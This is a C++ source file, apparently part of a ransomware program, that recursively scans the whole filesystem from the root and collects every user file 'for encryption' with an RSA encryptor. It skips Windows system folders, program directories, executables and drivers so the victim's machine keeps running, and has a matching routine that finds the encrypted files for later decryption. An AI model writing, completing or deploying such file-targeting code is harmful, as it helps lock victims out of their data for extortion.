#include "Folderservice.h"

FolderService::FolderService() {
    // Initialisation de la liste statique des parties de chemins à écarter
    m_exclude_paths.push_back("\\Windows");
    m_exclude_paths.push_back("Windows");
    m_exclude_paths.push_back("windows");
    m_exclude_paths.push_back("Program Files");
    m_exclude_paths.push_back("\\Program Files");
    m_exclude_paths.push_back("Program Files (x86)");
    m_exclude_paths.push_back("\\Program Files (x86)");
    m_exclude_paths.push_back("ProgramData");
    m_exclude_paths.push_back("\\ProgramData");
    m_exclude_paths.push_back("\\AppData");
    m_exclude_paths.push_back("AppData");
    m_exclude_paths.push_back("OneDrive");
    m_exclude_paths.push_back("\\OneDrive");
    m_exclude_paths.push_back(".exe");
    m_exclude_paths.push_back(".dll");
    m_exclude_paths.push_back(".sys");
    m_exclude_paths.push_back(".bak");
    m_exclude_paths.push_back(".old");
    m_exclude_paths.push_back(".tmp");
    m_exclude_paths.push_back(".avhd");
    m_exclude_paths.push_back(".avh");
    m_exclude_paths.push_back(".avb");
    m_exclude_paths.push_back(".dvp");
    m_exclude_paths.push_back(".db");
    m_exclude_paths.push_back(".dat");
    m_exclude_paths.push_back(".log");
    m_exclude_paths.push_back(".sdb");
    m_exclude_paths.push_back(".swp");
    m_exclude_paths.push_back(".swo");
    m_exclude_paths.push_back(".vhd");
    m_exclude_paths.push_back(".bkf");
    m_exclude_paths.push_back(".svg");
    m_exclude_paths.push_back(RSAEncryptor::ENCRYPTED_FILES_EXTENSION);
}

std::vector<std::string> FolderService::list_files_for_encryption() {
    m_data_files.clear();
    boost::filesystem::path root("/");

    for (boost::filesystem::directory_iterator it(root); it != boost::filesystem::directory_iterator(); ++it) {
        if (boost::filesystem::is_directory(it->path())) {
            list_files_in_directory_for_encryption(it->path());
        } else if(boost::filesystem::is_regular_file(it->path())) {
            std::string path = it->path().string();

            // Vérifie si le chemin contient l'une des parties de chemins à écarter
            bool exclude = is_excluded(path);

            if (!exclude) {
                m_data_files.push_back(path);
                std::cout<<"[File to encrypt]: "<<path<<std::endl;
            } else {
                std::cout<<"[Excluded file/Repo]: "<<path<<std::endl;
            }
        }
    }

    return get_data_files();
}

std::vector<std::string> FolderService::list_files_for_decryption() {
    m_data_files.clear();
    boost::filesystem::path root("/");

    for (boost::filesystem::directory_iterator it(root); it != boost::filesystem::directory_iterator(); ++it) {
        if (boost::filesystem::is_directory(it->path())) {
            list_files_in_directory_for_decryption(it->path());
        } else if (boost::filesystem::is_regular_file(it->path())) {
            std::string path = it->path().string();

            // Vérifie si le chemin contient l'une des parties de chemins à écarter
            bool exclude = is_excluded(path);

            if (!exclude) {
                if(path.find(RSAEncryptor::ENCRYPTED_FILES_EXTENSION) != std::string::npos) {
                    m_data_files.push_back(path);
                    std::cout<<"[File to decrypt]: "<<path<<std::endl;
                }
            }
        }
    }

    return get_data_files();
}

void FolderService::list_files_in_directory_for_encryption(boost::filesystem::path directory) {
    try {
        for (boost::filesystem::directory_iterator it(directory); it != boost::filesystem::directory_iterator(); ++it) {
            std::string path = it->path().string();

            // Vérifie si le chemin contient l'une des parties de chemins à écarter
            bool exclude = is_excluded(path);

            if (!exclude) {
                if (boost::filesystem::is_regular_file(it->path())) {
                    m_data_files.push_back(path);
                    std::cout<<"[File to encrypt]: "<<path<<std::endl;
                } else if (boost::filesystem::is_directory(it->path())) {
                    list_files_in_directory_for_encryption(it->path());
                }
            } else {
                std::cout<<"[Excluded file/Repo]: "<<path<<std::endl;
            }
        }
    } catch (const boost::filesystem::filesystem_error& e) {
        std::cout<<"[LIST-FILES-ERROR]: "<<e.what()<<std::endl;
    }
}

void FolderService::list_files_in_directory_for_decryption(boost::filesystem::path directory) {
    try {
        for (boost::filesystem::directory_iterator it(directory); it != boost::filesystem::directory_iterator(); ++it) {
                if (boost::filesystem::is_regular_file(it->path())) {
                    std::string path = it->path().string();

                    // Vérifie si le chemin contient l'une des parties de chemins à écarter
                    bool exclude = is_excluded(path);

                    if (!exclude) {
                        if(path.find(RSAEncryptor::ENCRYPTED_FILES_EXTENSION) != std::string::npos) {
                            m_data_files.push_back(path);
                            std::cout<<"[File to decrypt]: "<<path<<std::endl;
                        }
                    }
                } else if (boost::filesystem::is_directory(it->path())) {
                    list_files_in_directory_for_decryption(it->path());
                }
        }
    } catch (const boost::filesystem::filesystem_error& e) {
        std::cout<<"[LIST-FILES-ERROR]: "<<e.what()<<std::endl;
    }
}

bool FolderService::is_excluded(std::string path) {
    bool exclude = false;
    for (const std::string& exclude_path : m_exclude_paths) {
        if (path.find(exclude_path) != std::string::npos) {
            exclude = true;
            break;
        }
    }

    return exclude;
}
